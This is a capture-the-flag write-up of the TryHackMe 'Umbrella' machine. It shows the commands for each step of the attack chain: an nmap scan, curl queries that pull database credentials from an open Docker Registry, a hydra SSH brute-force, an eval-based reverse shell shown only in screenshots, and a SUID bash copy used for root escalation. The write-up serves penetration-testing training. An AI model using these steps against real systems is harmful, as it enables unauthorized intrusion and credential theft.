---
title: "TryHackMe | Umbrella"
layout: post
date: 2024-02-05 16:00
tag: 
- TryHackMe
- Pentesting
- Docker
- Linux
- Container
- EVAL
- RCE
image: https://tryhackme-images.s3.amazonaws.com/room-icons/e8d4455b09a1c0b71474cf6137805c48.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

Umbrella is a medium TryHackMe machine which runs the Docker Registry API V2 at port 5000. Where we can extract some MySQL DB credentials. And exploiting an eval function will give us a revshell as root in a Docker container. The root part is about exploiting a shared logs folder to trigger a root shell.

---

# Nmap

```bash
nmap -A -T4 10.10.46.174            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 09:56 +01
Nmap scan report for 10.10.46.174
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsCompression, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, SupportsTransactions, SupportsLoadDataLocal, LongPassword, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x15D\x083T\x1EZh\x19?C;4U#-\x1A2
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesnt have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have four open ports. Let's check the port 8080 :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208100136.png>)

We have the Docker Registry API V2 at port 5000. There is a doc about pentesting that service :

[https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)

Now let's enumerate that docker registry :

```bash
curl http://10.10.46.174:5000/v2/_catalog
```

![alt text](<../../../assets/images/THMPics/Pasted image 20240208101144.png>)

Using the bellow command we can see the DB password :

```bash
curl -s http://10.10.46.174:5000/v2/umbrella/timetracking/manifests/latest
```

![alt text](<../../../assets/images/THMPics/Pasted image 20240208104516.png>)

Using those credentials we can enumerate the MySQL DB :

```bash
mysql -h 10.10.46.174 -u root -p
```

![alt text](<../../../assets/images/THMPics/Pasted image 20240208104901.png>)

![alt text](<../../../assets/images/THMPics/Pasted image 20240208110116.png>)

Now we can login with a user from the users above :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208104843.png>)

Let's try if we can use those credentials to login via SSH :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208110424.png>)

Hydra can do the job for us :

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.46.174
```

Boom! we found a valid login creds :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208111155.png>)

And we're in as Claire user :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208110458.png>)

We can now read the user flag :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208110539.png>)

Checking the source code of the app in port 8080, we can see that it uses the eval function which we know is vulnerable to RCE :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208113152.png>)

[https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090](https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090)

![alt text](<../../../assets/images/THMPics/Pasted image 20240208113022.png>)

Using the payload from the POC above, we can get a revshell as the root user in the Docker container :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208112830.png>)

![alt text](<../../../assets/images/THMPics/Pasted image 20240208113212.png>)

We see that there is a logs directory mounted in our user's home :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208113727.png>)

The same directory is in root :

![alt text](<../../../assets/images/THMPics/Pasted image 20240208113645.png>)

So whatever file we create in the root shell, will be found the in the same directory in the user's shell. So we can copy `/bin/bash` to the `/logs` folder and give it SUID perm :

```bash
cp /bin/bash .
chmod 777 bash
chmod u+s bash
```

![alt text](<../../../assets/images/THMPics/Pasted image 20240208115100.png>)

And voilà we are root!

![alt text](<../../../assets/images/THMPics/Pasted image 20240208114151.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>